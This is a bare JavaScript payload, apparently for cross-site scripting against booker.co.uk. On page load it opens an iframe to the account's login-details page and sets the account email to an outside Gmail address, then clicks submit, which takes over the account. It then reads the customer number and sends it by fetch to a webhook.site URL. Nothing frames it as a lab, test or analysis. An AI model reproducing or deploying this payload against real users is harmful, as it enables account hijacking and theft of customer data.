document.addEventListener("DOMContentLoaded", function() {
    buildFrame();
})

function buildFrame() {
    let frame=document.createElement("iframe")
    frame.src="https://www.booker.co.uk/account/management/login-details"
    document.body.append(frame)
    setTimeout(function(){
        frame.contentDocument.getElementById("EmailAddress").value="velvet3scape@gmail.com"
        frame.contentDocument.getElementById("EmailAddressConfirm").value="velvet3scape@gmail.com"
        frame.contentDocument.querySelector("div.mb-2 .btn").click()
    }, 2000)
    setTimeout(function(){
        let customerNumber=frame.contentDocument.querySelector("#business-details div.detail span.detail-text").textContent
        fetch('https://webhook.site/fdf0efaa-77e7-4fd9-970d-3f018eb0c366/?x='+customerNumber)
    }, 5000)
}
